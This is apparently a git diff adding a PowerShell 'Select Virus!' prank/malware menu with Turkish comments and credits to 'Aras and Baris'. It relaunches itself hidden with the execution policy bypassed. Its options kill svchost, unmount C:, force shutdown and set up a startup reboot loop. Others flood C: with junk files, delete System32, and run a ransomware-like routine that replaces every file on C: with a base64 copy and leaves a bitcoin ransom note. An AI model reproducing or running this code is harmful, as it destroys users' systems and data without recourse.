@@ -1,0 +1,156 @@
+# Yeni bir gizli PowerShell işlemi başlat
+$scriptBlock = {
+    # GUI için gerekli assembly'leri yükle
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    [System.Windows.Forms.Application]::EnableVisualStyles()
+
+    # GUI oluşturma
+    $form = New-Object System.Windows.Forms.Form
+    $form.Text = "Select Virus!"
+    $form.Size = New-Object System.Drawing.Size(300,350)
+    $form.StartPosition = "CenterScreen"
+    $form.MaximizeBox = $false
+    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
+
+    # İkonu indir ve ayarla (isteğe bağlı)
+    try {
+        $iconUrl = "https://avatars.mds.yandex.net/i?id=1b721e6909a5649645a11ae80123ce70850871e1-12629451-images-thumbs&n=13"
+        $tempImagePath = "$($env:TEMP)\temp_icon.png"
+        $tempIconPath = "$($env:TEMP)\temp_icon.ico"
+        
+        Invoke-WebRequest -Uri $iconUrl -OutFile $tempImagePath -ErrorAction Stop
+        $image = [System.Drawing.Image]::FromFile($tempImagePath)
+        $bitmap = New-Object System.Drawing.Bitmap($image, 32, 32)
+        $bitmap.Save($tempIconPath, [System.Drawing.Imaging.ImageFormat]::Icon)
+        $form.Icon = New-Object System.Drawing.Icon($tempIconPath)
+        
+        Remove-Item $tempImagePath -Force -ErrorAction SilentlyContinue
+        Remove-Item $tempIconPath -Force -ErrorAction SilentlyContinue
+    } catch {
+        # İkon yüklenemezse sessizce geç
+    }
+
+    # ListBox oluşturma
+    $listBox = New-Object System.Windows.Forms.ListBox
+    $listBox.Location = New-Object System.Drawing.Point(10,10)
+    $listBox.Size = New-Object System.Drawing.Size(260,200)
+    $listBox.SelectionMode = "One"
+    $listBox.Items.Add("Blue Screen")
+    $listBox.Items.Add("Mountvol C:")
+    $listBox.Items.Add("Test MsgBox")
+    $listBox.Items.Add("Shutdown Pc")
+    $listBox.Items.Add("Good Bye Pc :D")
+    $listBox.Items.Add("Spam TXT")
+    $listBox.Items.Add("Delete System32!")
+    $listBox.Items.Add("WannaCry But Bad")
+    $form.Controls.Add($listBox)
+
+    # OK Butonu
+    $okButton = New-Object System.Windows.Forms.Button
+    $okButton.Location = New-Object System.Drawing.Point(10,220)
+    $okButton.Size = New-Object System.Drawing.Size(75,30)
+    $okButton.Text = "OK"
+    $form.Controls.Add($okButton)
+
+    # Credits Label
+    $creditsLabel = New-Object System.Windows.Forms.Label
+    $creditsLabel.Text = "Credits: Aras and Baris"
+    $creditsLabel.AutoSize = $true
+    $creditsLabel.Location = New-Object System.Drawing.Point(150, 290)
+    $form.Controls.Add($creditsLabel)
+
+    # OK butonuna tıklama olayı
+    $okButton.Add_Click({
+        $selectedItem = $listBox.SelectedItem
+        if ($selectedItem) {
+            switch ($selectedItem) {
+                "Blue Screen" {
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c taskkill /f /im svchost.exe" -NoNewWindow -Wait
+                }
+                "Mountvol C:" {
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c mountvol C: /d" -NoNewWindow -Wait
+                }
+                "Test MsgBox" {
+                    [System.Windows.Forms.MessageBox]::Show("Test", "Tes", "OK", "Information")
+                }
+                "Shutdown Pc" {
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown -s -t 00" -NoNewWindow -Wait
+                }
+                "Good Bye Pc :D" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "This code will be restart when pc opens. Are you Sure??",
+                        "WAWNING!",
+                        "OKCancel",
+                        "Warning"
+                    )
+                    if ($result -eq "OK") {
+                        $batContent = @"
+@echo off
+copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sa.bat"
+shutdown -r -t 00
+"@
+                        $batPath = "$($env:TEMP)\sa.bat"
+                        Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+                        Start-Process -FilePath $batPath -NoNewWindow
+                    }
+                }
+                "Spam TXT" {
+                    while ($true) {
+                        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+                        $filePath = "C:\${randomName}.txt"
+                        $sizeInBytes = 10MB
+                        $content = -join ((33..126) | Get-Random -Count $sizeInBytes | % {[char]$_})
+                        [System.IO.File]::WriteAllText($filePath, $content)
+                        Start-Sleep -Milliseconds 100
+                    }
+                }
+                "Delete System32!" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "WARNING! This action will delete the System32 folder and render your system unusable. Are you absolutely sure?",
+                        "DANGER!",
+                        "OKCancel",
+                        "Error"
+                    )
+                    if ($result -eq "OK") {
+                        $system32Path = "C:\Windows\System32"
+                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c takeown /f $system32Path /r /d y && icacls $system32Path /grant administrators:F /t" -NoNewWindow -Wait
+                        Remove-Item -Path $system32Path -Recurse -Force -ErrorAction SilentlyContinue
+                    }
+                }
+                "WannaCry But Bad" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "WARNING! This will encrypt ALL files on C: instantly (locked or not) and change their extension to .djashdk. This is IRREVERSIBLE without a decryption key. This process is a bit heavy, so the application might crash, but it will encrypt everything in the background. Are you sure?",
+                        "WannaCry Simulation",
+                        "OKCancel",
+                        "Error"
+                    )
+                    if ($result -eq "OK") {
+                        $files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue
+                        $encryptionKey = "WannaCrySimulationKey123"
+                        foreach ($file in $files) {
+                            $content = [System.IO.File]::ReadAllBytes($file.FullName)
+                            $encryptedContent = [Convert]::ToBase64String($content)
+                            $newFileName = $file.FullName + ".djashdk"
+                            [System.IO.File]::WriteAllText($newFileName, $encryptedContent)
+                            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
+                        }
+                        $ransomNote = @"
+Your files have been encrypted by WannaCry Simulation!
+To decrypt them, send 1 BTC to: [FakeAddress]
+"@
+                        Set-Content -Path "C:\README.txt" -Value $ransomNote -Force
+                    }
+                }
+            }
+        }
+    })
+
+    # Formu göster
+    $form.ShowDialog()
+}
+
+# Script bloğunu bir dosyaya kaydet ve gizli çalıştır
+$scriptPath = "$($env:TEMP)\hidden_script.ps1"
+$scriptBlock | Out-File -FilePath $scriptPath -Encoding UTF8
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -NoNewWindow
